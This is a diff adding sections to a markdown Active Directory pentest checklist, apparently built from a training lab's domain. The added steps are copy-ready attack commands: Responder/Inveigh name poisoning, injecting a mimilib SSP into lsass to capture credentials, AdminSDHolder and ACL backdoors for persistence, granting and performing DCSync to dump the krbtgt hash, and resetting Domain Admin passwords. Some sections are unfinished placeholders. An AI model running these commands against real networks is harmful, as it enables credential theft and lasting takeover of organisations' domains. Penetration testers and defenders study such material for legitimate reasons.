@@ -3,6 +3,7 @@
 ## Unauthenticated Testing
 ### Recon
 - [ ] Work out where we are
+
 ```bash
 nslookup localhost
 ```
@@ -39,7 +40,7 @@ nslookup localhost
 	nmblookup -A $IPAdress
 	```
 
-	![](../../../assets/screenshots/Pasted%20image%2020250518111327.png)
+	![](../../../../../assets/screenshots/Pasted%20image%2020250518111327.png)
 
 - [ ] Check LDAP
 
@@ -69,7 +70,36 @@ nslookup localhost
 
 ### Poisoning
 - [ ] Run responder in analyze mode
-- [ ] 
+	- Look for LLMNR, NBNS, MDNS
+	- Look for any other interesting requests
+
+		```bash
+		sudo responder -I $INTERFACE -A
+		```
+
+- [ ] Perform LLMNR/NBT-NS Poisoning
+
+	=== "Linux"
+	
+		```bash
+		sudo responder -I $INTERFACE -A
+		```
+	
+	=== "Windows"
+	
+		```powershell
+		Import-Module .\Inveigh.ps1
+		```
+		
+		```powershell
+		Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+		```
+		
+		!!! tip "Disable NBT-NS"
+		
+			The following can be used to disable NBT-NS on Windows
+			
+			`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`
 
 ## Domain Enumeration
 
@@ -1085,5 +1115,196 @@ nslookup localhost
 		```powershell
 		Enter-PSSession -ComputerName $DC_IP -Authentication NegotiateWithImplicitCredential
 		```
+
+=== "Custom SSP"
+
+	!!! tip "Security Support Provider"
+	
+		An SSP is a DLL which provides ways for an application to obtain an authenticated session
+	
+	Drop mimilib
+	
+	```powershell
+	$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+	```
+	
+	Inject into lsass
+	
+	```powershell
+	SafetyKatz.exe -Command '"misc::memssp"'
+	```
+	
+	!!! danger "Warning for Server 2019 and Server 2022"
+	
+		This isn't super stable on 2019 and 2022 -- be careful!
+
+### Persistence via ACL
+
+#### Protected Groups
+
+- Account Operators 
+- Enterprise Admins 
+- Backup Operators 
+- Domain Controllers 
+- Server Operators 
+- Read-only Domain Controllers 
+- Print Operators 
+- Schema Admins 
+- Domain Admins 
+- Administrators 
+- Replicator
+
+!!! tip "Protected users"
+
+	Well known abuse of some of the Protected Groups - All of the below can log on locally to DC
+
+	- Account Operators - Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
+	- Backup Operators - Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
+	- Server Operators - Run a command as system (using the disabled Browser service)
+	- Print Operators - Copy ntds.dit backup, load device drivers.
+
+=== "AdminSDHolder"
+
+	!!! info "AdminSDHolder"
+	
+		With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
+	
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		Add full control permissions for a user to the AdminSDHolder
+		
+		```powershell
+		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 - Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+		```
+		
+		Using AD Module and RACE toolkit
+		
+		```powershell
+		Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 - Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' - Verbose
+		```
+		
+		Other interesting permissions
+		
+		```powershell
+		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc al' -PrincipalIdentity student1 -Rights ResetPassword - PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+		```
+		
+		```powershell
+		Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+		```
+		
+		Run SDProp
+		
+		```powershell
+		Invoke-SDPropagator -timeoutMinutes 1 -showProgress - Verbose
+		```
+		
+		For pre-Server 2008 machines
+		
+		```powershell
+		Invoke-SDPropagator -taskname FixUpInheritance - timeoutMinutes 1 -showProgress -Verbose
+		```
+		
+		Check domain admins permissions
+		
+		```powershell
+		Get-DomainObjectAcl -Identity 'Domain Admins' - ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+		```
+		
+		Using AD Module
+		
+		```powershell
+		(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Ac cess | ?{$_.IdentityReference -match 'student1'}
+		```
+		
+		Abusing full control using PowerView
+		
+		```powershell
+		Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+		```
+		
+		Using AD Module
+		
+		```powershell
+		Add-ADGroupMember -Identity 'Domain Admins' -Members testda
+		```
+		
+		Abusing ResetPassword - PowerView
+		
+		```powershell
+		Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
+		```
+		
+		With AD Module
+		
+		```powershell
+		Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText - Force) -Verbose
+		```
+	
+=== "Rights Abuse"
+
+	- [ ] Add full control rights
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		```powershell
+		Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+		```
+
+		```powershell
+		Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
+		```
+
+	- [ ] Add rights for DCSync
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		```powershell
+		Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+		```
+		
+		```powershell
+		Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
+		```
+
+	- [ ] Perform DCSync
+
+	=== "Linux"
+	
+		```bash
+		something
+		```
+	
+	=== "Windows"
+	
+		```powershell
+		Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+		```
+		
+		```powershell
+		SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+		```
+
+=== "Security Descriptors"
+
+	something else
 ## Cross-Trust Attacks
 
